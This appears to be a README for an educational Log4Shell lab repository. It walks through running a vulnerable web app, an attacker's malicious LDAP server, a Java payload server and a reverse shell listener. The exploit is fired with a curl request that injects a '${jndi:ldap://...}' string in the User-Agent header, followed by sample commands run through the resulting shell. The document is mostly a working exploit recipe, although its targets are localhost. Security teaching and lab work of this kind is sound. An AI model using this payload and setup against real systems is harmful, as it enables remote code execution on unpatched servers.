# log4Shell
log4Shell vulnerability RCE sample via reverse shell

**NOTE**

This repo is only for educational purposes only

---


## Run victim web server (app)
```
gradlew build
java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar build\libs\app-0.0.1.jar
```

## Run attacker malicious ldap server (ldap)
```
gradlew build
java -jar build\libs\ldap-1.0.0.jar http://localhost:8081/#Payload 636
```

## Run attacker java class payload server (payload)
```
gradlew build
java -jar build\libs\payload-1.0.0.jar
```

## Run attacker reverse shell server (rce)
```
gradlew build
java -jar build\libs\rce-1.0.0.jar

```

## Executing the attack
```
curl http://localhost:8080/ -H 'User-Agent:${jndi:ldap://0.0.0.0:636/a}'
```

## Sample command in reverse shell
```
cmd /C whoami
notepad
```




### More info
https://www.lunasec.io/docs/blog/log4j-zero-day/
https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java

